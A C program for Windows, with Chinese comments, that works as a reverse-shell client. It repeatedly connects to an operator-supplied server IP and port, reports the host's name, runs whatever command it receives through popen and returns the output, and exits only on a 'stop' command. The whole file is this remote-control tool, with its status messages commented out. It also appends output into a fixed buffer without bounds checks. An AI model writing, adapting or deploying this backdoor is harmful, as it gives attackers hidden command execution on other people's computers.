#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

SOCKET client_socket;
int recvtimeout = 3000;
char ipaddr[] = "127.0.0.1";//换成你的服务器ip
int port = 233;




void cleanup(){
	closesocket(client_socket);// 关闭Socket
	WSACleanup();// 清理Winsock库
}




void connecttoserver(){
	
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ipaddr);
	
	//尝试连接并发送验证信息
	client_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&recvtimeout, sizeof(recvtimeout));//设置超时
	
	int connstatus = 1;
	while(connstatus != 0){
		

		connstatus = connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));

	}
	//printf("Connected to the server\n");
			
	char hostname[256];
	gethostname(hostname, sizeof(hostname));
	send(client_socket, hostname, strlen(hostname), 0);
}




int main() {
	atexit(cleanup);//退出时关闭连接
	
    // 初始化Winsock库
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 1;
    }

    // 接收服务器的响应数据
	while(1){
		char buffer[1024];
		memset(buffer, 0, sizeof(buffer));
		int recvstatus = recv(client_socket, buffer, sizeof(buffer), 0);
		if(recvstatus == SOCKET_ERROR || recvstatus == 0){//超时重新连接
			
			closesocket(client_socket);//断开原有连接
			
			connecttoserver();//首次连接或重新连接

			continue;

		}
		
		//printf("Received command from server: %s\n", buffer);
		///////////////////////命令为stop时退出
		if(strcmp("stop",buffer) == 0){
			send(client_socket, "stoped", strlen("stoped"), 0);
			exit(0);
		}
		///////////////////////使用popen执行命令
		if(strcmp("test",buffer) != 0){
			char commandresponse[65536] = "";
			char commandresponsebuffer[128];
			FILE *fp;
			fp = popen(buffer,"r");
			while (fgets(commandresponsebuffer, sizeof(commandresponsebuffer), fp) != NULL) {
				// 将命令输出追加到结果变量中
				strcat(commandresponse, commandresponsebuffer);
			}
			
			if (strlen(commandresponse) == 0) {
				// 如果返回值为空，将其赋值为"empty response"
				strcpy(commandresponse, "empty response\n");
			}
			
			//printf("output response\n");
			//printf(commandresponse);
			send(client_socket, commandresponse, strlen(commandresponse), 0);
			
			pclose(fp);

		//////////////////
		}
	}

    return 0;
}
